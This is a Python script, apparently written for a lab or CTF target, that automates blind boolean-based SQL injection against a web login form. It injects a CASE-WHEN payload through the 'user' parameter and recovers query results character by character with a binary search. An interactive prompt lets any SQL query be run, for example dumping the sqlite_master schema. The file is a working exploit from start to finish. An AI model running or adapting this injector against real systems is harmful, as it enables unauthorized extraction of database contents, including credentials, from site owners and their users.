from __future__ import print_function
import requests, sys
# BASE_URL = "http://192.168.40.132:5002/login"
BASE_URL = "http://127.0.0.1:5000/login"
SUCCESS_TEXT = "YEEEEY"
URL_PARAMS = {'user': None,
              'pass': None}

def get_query_result(data):
    global URL_PARAMS
    # print 'data=',data
    URL_PARAMS['user'] = data
    pagecontent = requests.get(BASE_URL, params=URL_PARAMS).text
    # print pagecontent
    if SUCCESS_TEXT in pagecontent:
        return True
    else:
        return False

# BASE_QUERY = "' or 1=if(({}){}{},1,2);-- "
BASE_QUERY = "' or 1=case when ({}){}{} then 1 else 2 end;-- "

def binsearch(query,sl,sh,fn=int):
    searchlow = sl
    searchhigh = sh
    searchmid = 0
    while True:
        searchmid = (searchlow + searchhigh) / 2
        if get_query_result(BASE_QUERY.format(query, "=", fn(searchmid))):
            break
        elif get_query_result(BASE_QUERY.format(query, ">", fn(searchmid))):
            searchlow = searchmid + 1
        elif get_query_result(BASE_QUERY.format(query, "<", fn(searchmid))):
            searchhigh = searchmid
    return searchmid

def querylength(query):
    return binsearch("length(({}))".format(query),0,1000)

def execquery(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print("Retrieving {} bytes".format(qlen-1))
    total=len(range(1,qlen))
    for i in range(1,qlen):
        printProgressBar(i, total, prefix = 'Progress:', suffix = 'Complete', length = 50)
        fulltext+=chr(binsearch("substr(({}),{},1)".format(query,i),0,127,lambda x: "'"+chr(x)+"'" if chr(x)!="'" else '"\'"'))
    print("Result:")
    print(fulltext)

def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '='):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
    """
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = '\r')
    # Print New Line on Complete
    if iteration == total:
        print()

if __name__=='__main__':
    # execquery('select sql from sqlite_master')
    query=raw_input('$>')
    while not query.strip():
        query=raw_input('$>')
    while query!="exit":
        execquery(query)
        query=raw_input('$>')
        while not query.strip():
            query=raw_input('$>')
